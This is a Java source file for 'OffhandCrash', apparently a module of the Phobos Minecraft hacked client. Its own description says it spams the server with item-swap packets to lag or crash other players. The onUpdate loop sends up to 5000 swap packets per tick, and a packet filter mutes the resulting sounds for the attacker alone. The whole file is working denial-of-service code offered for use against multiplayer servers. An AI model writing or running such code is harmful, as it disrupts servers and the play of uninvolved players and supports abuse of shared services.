package me.earth.phobos.features.modules.misc;

import me.earth.phobos.event.events.PacketEvent;
import me.earth.phobos.features.modules.Module;
import me.earth.phobos.features.setting.Setting;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.init.SoundEvents;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.server.SPacketSoundEffect;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class OffhandCrash
extends Module {
    private final Setting<Boolean> antilag = this.register(new Setting<Boolean>("AntiOffhandCrash", true));
    private final Setting<Boolean> docrash = this.register(new Setting<Boolean>("Use Offhand Crash", true));
    private final Setting<Integer> loopzz = this.register(new Setting<Integer>("Times to loop", 500, 100, 5000));

    public OffhandCrash() {
        super("OffhandCrash", "Spams server with item swap packets to lag/crash other players with large amounts of sound", Module.Category.MISC, false, false, false);
    }

    @SubscribeEvent
    public void onPacketSend(PacketEvent.Receive event) {
        SPacketSoundEffect packet;
        if (this.antilag.getValue().booleanValue() && event.getPacket() instanceof SPacketSoundEffect && (packet = (SPacketSoundEffect)event.getPacket()).getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) {
            event.setCanceled(true);
        }
    }

    @Override
    public void onLogout() {
        this.disable();
    }

    @Override
    public void onUpdate() {
        if (this.docrash.getValue().booleanValue()) {
            for (int i = 0; i < this.loopzz.getValue(); ++i) {
                BlockPos playerBlock = new BlockPos(OffhandCrash.mc.player.field_70165_t, OffhandCrash.mc.player.field_70163_u - 1.0, OffhandCrash.mc.player.field_70161_v);
                OffhandCrash.mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
            }
        }
        if ((OffhandCrash.mc.currentScreen instanceof GuiMainMenu || OffhandCrash.mc.currentScreen instanceof GuiDisconnected || OffhandCrash.mc.currentScreen instanceof GuiDownloadTerrain || OffhandCrash.mc.currentScreen instanceof GuiConnecting || OffhandCrash.mc.currentScreen instanceof GuiMultiplayer) && this.isEnabled()) {
            this.toggle();
        }
    }
}
